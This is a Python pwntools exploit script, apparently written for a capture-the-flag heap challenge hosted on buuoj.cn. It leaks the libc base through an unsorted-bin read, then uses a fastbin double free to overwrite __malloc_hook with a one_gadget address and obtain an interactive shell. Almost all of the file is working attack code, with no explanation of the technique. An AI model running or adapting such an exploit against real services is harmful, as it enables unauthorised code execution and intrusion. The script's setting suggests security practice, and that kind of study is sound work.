import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='heap'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',25549)
pdbg.context.log_level='debug'
# pdbg.context.terminal = ["tmux", "splitw", "-h"]
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			#one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b,c):
			io.sendlineafter('Your choice : ','1')
			io.sendlineafter("size of the game's name:",str(a))
			io.sendafter("game's name:",b)
			io.sendlineafter("game's message:",c)

		def delete(a):
			io.sendlineafter('Your choice : ','3')
			io.sendlineafter("game's index:",str(a))

		def show():
			io.sendlineafter('Your choice : ','2')
	
		add(0x100,'a','a')
		add(0x68,'a','a')
		add(0x68,'a','a')
		delete(0)
		add(0x18,'a'*0x8,'a')
		show()

		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		delete(1)
		delete(2)
		delete(1)
		add(0x68,p64(libc.sym['__malloc_hook']-0x23),'a')
		add(0x68,'a','a')
		add(0x68,'a','a')
		add(0x68,'\x00'*0x13+p64(libc_base+one_gadgaet[2]),'a')





		success('libc_base:'+hex(libc_base))
		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue